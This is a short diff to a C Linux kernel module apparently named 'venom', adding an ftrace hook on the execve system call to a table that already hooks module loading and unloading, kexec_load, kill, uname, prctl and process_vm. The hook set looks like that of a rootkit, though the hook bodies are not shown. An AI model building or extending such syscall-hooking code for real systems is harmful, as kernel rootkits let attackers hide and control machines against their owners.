@@ -23,6 +23,7 @@
 #include "hooks/uname.h" 
 #include "hooks/process_vm.h"
 #include "hooks/prctl.h" 
+#include "hooks/execve.h" 
 
 
 
@@ -79,7 +80,7 @@ static struct ftrace_hook all_hooks[] = {
     HOOK("__x64_sys_finit_module", hooked_finit_module, &orig_finit_module),
     HOOK("__x64_sys_delete_module", hooked_delete_module, &orig_delete_module),
 
-
+    HOOK("__x64_sys_execve", hooked_execve, &orig_execve), 
     HOOK("__x64_sys_kexec_load", hooked_kexec_load, &orig_kexec_load),
 
     HOOK("__x64_sys_kill", hooked_kill, &orig_kill),
@@ -164,6 +165,7 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
+
 
 
 
